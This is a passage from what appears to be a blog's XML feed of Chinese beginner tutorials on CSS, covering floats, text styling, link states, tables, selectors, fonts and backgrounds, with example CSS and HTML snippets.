alt="image-20221116010753322"></p><p>有两个浮动的box，若我们想让box2排列在box1下面，就像box1无浮动，box2浮动那样，按照我们看到文档的一般想法，是在box1上使用<code>clear:right</code>，以此来达到“不允许右边有浮动对象”的效果</p><p>但是，我们提到了只能<strong>影响本身</strong>的这个特性，因此我们需要在box2本身去使用clear属性，让box2<code>clear:left</code>，不允许其左边有浮动属性，迫使box2下移一行：</p><p><img src="https://image.icewindy.cn/202211160117407.png" alt="image-20221116011750381"></p><p>以上就是浮动的基本的概念了</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web三板斧 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发基础（3）：CSS文本、链接、表格、伪类选择器</title>
      <link href="/2022/11/09/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%883%EF%BC%89%EF%BC%9ACSS%E6%96%87%E6%9C%AC%E3%80%81%E9%93%BE%E6%8E%A5%E3%80%81%E8%A1%A8%E6%A0%BC%E3%80%81%E4%BC%AA%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8/"/>
      <url>/2022/11/09/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%883%EF%BC%89%EF%BC%9ACSS%E6%96%87%E6%9C%AC%E3%80%81%E9%93%BE%E6%8E%A5%E3%80%81%E8%A1%A8%E6%A0%BC%E3%80%81%E4%BC%AA%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="文本-text">文本 text</h2><h3 id="颜色-color">颜色 color</h3><p>color是一个非常常用的css指定，在body选择器中指定的color，将会成为页面默认的文本颜色</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">color</span>:red;&#125;</span><br><span class="line"><span class="selector-tag">h1</span> &#123;<span class="attribute">color</span>:<span class="number">#00ff00</span>;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.ex</span> &#123;<span class="attribute">color</span>:<span class="built_in">rgb</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>);&#125;</span><br></pre></td></tr></table></figure><h3 id="对齐方式-text-align">对齐方式 text-align</h3><p>该属性可以设定文本的水平对齐方式。</p><p>文本可以<strong>居中center</strong>、<strong>对齐到左left</strong>或<strong>右right</strong>、<strong>两端对齐justify</strong></p><p>两端对齐就是每一行都展开为宽度相等，左右边距都是对齐（如杂志和报纸）</p><p><img src="https://image.icewindy.cn/202211092226128.png" alt="image-20221109222638064"></p><h3 id="文本修饰-text-decoration">文本修饰 text-decoration</h3><p>该属性用于设置文本的<strong>上划线（overline）</strong>、<strong>下划线（underline）</strong>、**划去（line-through）<strong>以及</strong>删除链接的下划线（none）**等修饰</p><p><img src="https://image.icewindy.cn/202211092252640.png" alt="image-20221109225246612"></p><h3 id="文本转换-text-transform">文本转换 text-transform</h3><p>该属性用于设置一个文本的大写或者小写字母</p><p>可用于所有字句变成<strong>大写（uppercase）<strong>或</strong>小写（lowercase）<strong>字母，或</strong>每个单词的首字母大写（capitalize）</strong>。</p><h3 id="文本缩进-text-indent">文本缩进 text-indent</h3><p>该属性可以指定文本第一行缩进的大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">text-indent</span>:<span class="number">50px</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="链接">链接</h2><p>链接有四个状态</p><ul><li>a:link - 一般情况，未访问过的链接</li><li>a:visited - 用户已经访问过的链接</li><li>a:hover - 用户的光标悬停在链接上时</li><li>a:active - 被点击的那一刻</li></ul><p>这四个状态都可以单独设定样式，状态的样式设置有一定的顺序规矩：</p><ul><li>a:hover 必须跟在 a:link 和 a:visited后面</li><li>a:active 必须跟在 a:hover后面</li></ul><p>常见的样式设置有<strong>文本修饰（text-decoration）</strong>、<strong>背景颜色（background-color）</strong>、**字体大小（font-size）**等等，基本上文本修饰可以使用的，在链接上都可以使用。</p><h2 id="表格">表格</h2><h3 id="边框-border">边框 border</h3><p>该属性可以设置边框的相关属性，<strong>厚度</strong>、<strong>边框样式（连续、分段等）</strong>、<strong>颜色</strong>等</p><p>他们可以写在同一个定义中，以空格分开，也可以分开几个定义</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line"></span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span>;</span><br><span class="line"><span class="attribute">border</span>: solid;</span><br><span class="line"><span class="attribute">border</span>: black;</span><br></pre></td></tr></table></figure><p>值的顺序无关紧要</p><p><img src="https://image.icewindy.cn/202211100116142.png" alt="image-20221110011604103"></p><h3 id="单个边框-border-collapse">单个边框 border-collapse</h3><p>该属性可以将默认两个边框的折叠成一个边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span> &#123;</span><br><span class="line">    <span class="attribute">border-collapse</span>:collapse;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">table</span>,<span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202211100115969.png" alt="image-20221110011549930"></p><h3 id="宽度和高度-width-height">宽度和高度 width、height</h3><p>该属性值与文字值类似，可以用百分数或者是像素等等来表示宽度或者高度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">th</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文字对齐-text-align-vertical-alig">文字对齐 text-align、vertical-alig</h3><p>该属性用于设置表格中的文本对齐与垂直属性</p><p>水平对齐属性 <code>text-align</code>可以设置<strong>居中center</strong>、<strong>对齐到左left</strong>或<strong>右right</strong></p><p>垂直对齐属性<code>vertical-alig</code>设置垂直对齐，比如<strong>顶部top</strong>，<strong>底部bottom</strong>或<strong>中间middle</strong></p><h3 id="表格单元格大小-padding">表格单元格大小 padding</h3><p>该属性用于控制单元格大小</p><p>padding可以接受1-4个值：</p><ul><li>当只指定<strong>一个</strong>值时，该值会统一应用到<strong>全部四个边</strong>的内边距上。</li><li>指定<strong>两个</strong>值时，第一个值会应用于<strong>上边和下边</strong>的内边距，第二个值应用于<strong>左边和右边</strong>。</li><li>指定<strong>三个</strong>值时，第一个值应用于<strong>上边</strong>，第二个值应用于<strong>右边和左边</strong>，第三个则应用于<strong>下边</strong>的内边距。</li><li>指定<strong>四个</strong>值时，依次（顺时针方向）作为<strong>上边</strong>，<strong>右边</strong>，<strong>下边</strong>，和<strong>左边</strong>的内边距。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 应用于所有边 */</span></span><br><span class="line"><span class="attribute">padding</span>: <span class="number">1em</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上边下边 | 左边右边 */</span></span><br><span class="line"><span class="attribute">padding</span>: <span class="number">5%</span> <span class="number">10%</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上边 | 左边右边 | 下边 */</span></span><br><span class="line"><span class="attribute">padding</span>: <span class="number">1em</span> <span class="number">2em</span> <span class="number">2em</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 上边 | 右边 | 下边 | 左边 */</span></span><br><span class="line"><span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">1em</span> <span class="number">0</span> <span class="number">2em</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 全局值 */</span></span><br><span class="line"><span class="attribute">padding</span>: inherit;</span><br><span class="line"><span class="attribute">padding</span>: initial;</span><br><span class="line"><span class="attribute">padding</span>: unset;</span><br></pre></td></tr></table></figure><h3 id="颜色-background-color-color">颜色 background-color、color</h3><p><code>background-color</code>用于设定表格的背景颜色</p><p><code>color</code>用于设定表格内的文本颜色</p><p>下面例子分别设定了</p><ul><li>表格的间距、样式、颜色</li><li>表头的背景颜色和文本颜色</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span>, <span class="selector-tag">td</span>, <span class="selector-tag">th</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>:<span class="number">1px</span> solid green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">th</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>:green;</span><br><span class="line">    <span class="attribute">color</span>:white;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202211112127271.png" alt="image-20221111212727215"></p><h2 id="伪类选择器">伪类选择器</h2><p>伪类：专门用来表现元素的一种特殊状态</p><p>实际上，我们在上面就有一种伪类选择器，即链接的四种状态</p><p>常用的伪类选择器</p><ul><li><p>超链接伪类 <code>&lt;a&gt;</code></p><p><code>a:visited</code>已被访问</p><p><code>a:link</code>未访问</p><p><code>a:hover</code>悬停</p><p><code>a:active</code>点击瞬间</p></li><li><p>表单</p><p><code>:focus</code>获得焦点</p></li><li><p>:first-child</p><p>选择元素的第一个子元素，如列表第一个元素</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web三板斧 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发基础（2）：CSS选择器、字体、背景</title>
      <link href="/2022/10/20/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89%EF%BC%9ACSS%E9%80%89%E6%8B%A9%E5%99%A8%E3%80%81%E5%AD%97%E4%BD%93%E3%80%81%E8%83%8C%E6%99%AF/"/>
      <url>/2022/10/20/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89%EF%BC%9ACSS%E9%80%89%E6%8B%A9%E5%99%A8%E3%80%81%E5%AD%97%E4%BD%93%E3%80%81%E8%83%8C%E6%99%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="css简介">CSS简介</h2><p>CSS (Cascading Style Sheets，层叠样式表），是一种用来为<strong>结构化文档</strong>（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言</p><h2 id="css语法">CSS语法</h2><p>CSS主要由两个主要部分组成：选择器与一条或多条声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选择器 &#123;属性:值;...&#125;</span><br></pre></td></tr></table></figure><p>选择器是需要更改样式的HTML元素</p><p>每条声明由一个属性和一个值组成</p><p>属性是需要设置的样式属性，属性与值间用冒号隔开</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="选择器">选择器</h2><p>如果需要在HTML元素中设置CSS样式，一般来说我们可以在元素中设置<code>id</code>和<code>class</code>标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;text1&quot;</span>&gt;</span>text1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text2&quot;</span>&gt;</span>text2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="id选择器">id选择器</h3><p>id选择器可以为标有特定id的HTML代码指定特定的样式</p><p>在CSS中id选择器以<code>#</code>就开头来定义</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#text1</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="class选择器">class选择器</h3><p>class选择器可以用于描述一组元素的样式，class与id选择器不同处在于class选择器可以在多个元素中使用</p><p>在CSS中id选择器以<code>.</code>开头为定义，以下例子为应用在所有<code>text2</code>类的HTML元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text2</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以指定某个元素使用class选择器，以下实例中即让p元素使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.text2</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通配符选择器">通配符选择器</h3><p>通配符选择器可以选取页面中所有的元素（标签）</p><p>在CSS中，它使用<code>*</code>来定义</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通配符选择器不需要调用，会自动给所有元素使用样式</p><p>一般而言只有在特殊情况下才会使用，例如清楚所有的元素标签的内外边距</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分组选择器">分组选择器</h3><p>使用<code>,</code>可以将不同的选择器组合在一起，它选择所有能被列表中的任意一个选择器选中的节点。语法<code>A, B</code>，A、B为不同选择器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>, <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="css使用">CSS使用</h2><p>插入CSS的方法有三种</p><ul><li>外部样式表</li><li>内部样式表</li><li>内联样式</li></ul><h3 id="外部样式表">外部样式表</h3><p>如果样式表需要应用在多个页面的时候，外部样式表就是最理想的选择</p><p>通过在HTML文档头部使用<code>&lt;link&gt;</code>标签可以连接到样式表文件<code>xxx.css</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器在渲染输出的时候会将<code>style.css</code>文件读取并格式化文档</p><h3 id="内部样式表">内部样式表</h3><p>当某个文档需要特殊样式时，就可以用到内部样式表</p><p>通过在HTML文档头部使用<code>&lt;style&gt;</code>标签在文档头部可以定义内部样式表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内联样式">内联样式</h3><p>内联样式这种方法，一般会用仅需要在一个元素上应用一次的情况。由于内联样式要将央视哦与内容混在一起，会丢失样式表本有的优势，所以这种方式需要慎用</p><p>通过在标签内使用<code>style</code>属性，可以在标签中使用CSS样式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:red;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="多重样式">多重样式</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。</p><p>一般情况下，多重样式的优先级为</p><p>内联样式 &gt; 内部样式表 &gt; 外部样式表 &gt; 浏览器默认样式</p><p>外部样式表</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h3</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>:red;</span><br><span class="line">    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">8pt</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部样式表</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h3</span> &#123;</span><br><span class="line">    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">20pt</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>h3最终得到的样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">color</span>:red;</span><br><span class="line"><span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;</span><br><span class="line"><span class="attribute">font-size</span>:<span class="number">20pt</span>;</span><br></pre></td></tr></table></figure><h2 id="字体-font">字体 Font</h2><h3 id="字体系列-font-family">字体系列 font-family</h3><p>font-family 属性设置文本的字体，例如设置为宋体、黑体等</p><p>如果字体系列的名称超过一个字或者一个单词，它必须用引号，如Font Family：“宋体”。</p><p>font-family 属性应该设置几个字体名称作为一种&quot;后备&quot;机制，如果浏览器不支持第一种字体，他将尝试下一种字体。<a href="https://www.runoob.com/cssref/css-websafe-fonts.html">CSS Web安全字体 | 菜鸟教程 (runoob.com)</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">font-family</span>:<span class="string">&quot;Times New Roman&quot;</span>, Times, serif&#125;</span><br></pre></td></tr></table></figure><h3 id="字体样式-font-style">字体样式 font-style</h3><p>该属性用于指定斜体文字的样式属性</p><p>这个属性有三个值：</p><ul><li>normal - 正常</li><li>italic - 以斜体字显示的文字</li><li>oblique - 文字向一边倾斜（与斜体非常类似）</li></ul><p>因为不是所有的字体都有斜体，italic 是使用文字的斜体，oblique 是让没有斜体属性的文字倾斜</p><p>oblique是可以设定字体倾斜的角度<code>font-style: oblique 40deg;</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.normal</span> &#123;<span class="attribute">font-style</span>:normal;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.italic</span> &#123;<span class="attribute">font-style</span>:italic;&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.oblique</span> &#123;<span class="attribute">font-style</span>:oblique;&#125;</span><br></pre></td></tr></table></figure><h3 id="字体大小-font-size">字体大小 font-size</h3><p>该属性用于设置文本的大小，合理管理文字的大小，在网页设计中是非常重要的</p><p>字体大小的值可以是相对大小或绝对大小，也可以是个固定的值，还可以是个基于父元素的百分比值</p><p>相对大小</p><ul><li>相对于周围的元素来设置大小</li><li>允许用户在浏览器种改变文字大小</li></ul><p>绝对大小</p><ul><li>设定一个指定大小的文本</li><li>不允许用户在浏览器中改变文本大小</li><li>确定了输出的物理尺寸时绝对大小很有用</li></ul><h4 id="绝对大小">绝对大小</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-size</span>: xx-small;</span><br><span class="line"><span class="attribute">font-size</span>: x-small;</span><br><span class="line"><span class="attribute">font-size</span>: small;</span><br><span class="line"><span class="attribute">font-size</span>: medium;</span><br><span class="line"><span class="attribute">font-size</span>: large;</span><br><span class="line"><span class="attribute">font-size</span>: x-large;</span><br><span class="line"><span class="attribute">font-size</span>: xx-large;</span><br></pre></td></tr></table></figure><h4 id="相对大小">相对大小</h4><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>smaller</td><td>把 font-size 设置为比父元素更小的尺寸。</td></tr><tr><td>larger</td><td>把 font-size 设置为比父元素更大的尺寸。</td></tr></tbody></table><h4 id="像素">像素</h4><p>像素(px)是网页中最常用的单位，同样的，我们也可以通过px作为固定值来设定我们字体的大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">font-size</span>:<span class="number">14px</span>;&#125;</span><br></pre></td></tr></table></figure><p>如果你不指定一个字体大小，默认大小和普通文本段落一样，为16px(1em)</p><h3 id="字体粗细-font-weight">字体粗细 font-weight</h3><p>该属性用于设定字体的粗细</p><table><thead><tr><th style="text-align:left">值</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">normal</td><td style="text-align:left">默认值。定义标准的字符。</td></tr><tr><td style="text-align:left">bold</td><td style="text-align:left">定义粗体字符。</td></tr><tr><td style="text-align:left">bolder</td><td style="text-align:left">定义更粗的字符。</td></tr><tr><td style="text-align:left">lighter</td><td style="text-align:left">定义更细的字符。</td></tr><tr><td style="text-align:left">100、200、300…900</td><td style="text-align:left">定义由细到粗的字符。400 等同于 normal，而 700 等同于 bold。</td></tr><tr><td style="text-align:left">inherit</td><td style="text-align:left">规定应该从父元素继承字体的粗细。</td></tr></tbody></table><h2 id="背景-background">背景 Background</h2><h3 id="背景颜色-background-color">背景颜色 background-color</h3><p>该属性定义了元素的背景颜色</p><p>颜色的值可以用以下方法定义：</p><ul><li>十六进制 例：“#ff0000”</li><li>RGB 例：“rgb(255,0,0)”</li><li>颜色名称 例：“red”</li></ul><p>页面的背景颜色使用在body的选择器上</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:red;&#125;</span><br></pre></td></tr></table></figure><p><code>&lt;h1-h6&gt;</code>、<code>&lt;p&gt;</code>、<code>&lt;div&gt;</code>等等标签都可以通过自己的选择器调整各自的背景颜色</p><h3 id="背景图片-backgroud-image">背景图片 backgroud-image</h3><p>该属性定义了元素的背景图像，默认情况背景图像会平铺重复显示，覆盖整个元素实体</p><p>同样的，页面的背景图片设置也在body的选择器上</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;backgroud-image:<span class="built_in">url</span>(<span class="string">&#x27;xxx.jpg&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure><h4 id="平铺方式-background-repeat">平铺方式 background-repeat</h4><p>我们可以通过<code>background-repeat</code>属性设置平铺方式</p><p>水平平铺</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    backgroud-image:<span class="built_in">url</span>(<span class="string">&#x27;xxx.jpg&#x27;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>:repeat-x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不平铺</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    backgroud-image:<span class="built_in">url</span>(<span class="string">&#x27;xxx.jpg&#x27;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>:no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="图像定位-background-position">图像定位 background-position</h4><p>我们还可以通过<code>background-position</code>改变图像在背景的位置</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&#x27;img_tree.png&#x27;</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>:no-repeat;</span><br><span class="line">    <span class="attribute">background-position</span><span class="selector-pseudo">:right</span> <span class="attribute">top</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="简写属性">简写属性</h4><p>由于背景需要通过多个属性来控制，为了简化这些属性的代码，我们可以将其合并为同一个属性中</p><p>当使用简写属性时，属性值的顺序为：</p><ul><li>background-color</li><li>background-image</li><li>background-repeat</li><li>background-attachment</li><li>background-position</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background</span>:<span class="number">#ffffff</span> <span class="built_in">url</span>(<span class="string">&#x27;img_tree.png&#x27;</span>) no-repeat right top;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web三板斧 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Server笔记（1）</title>
      <link href="/2022/10/12/SQLServer%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89/"/>
      <url>/2022/10/12/SQLServer%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89/</url>
      
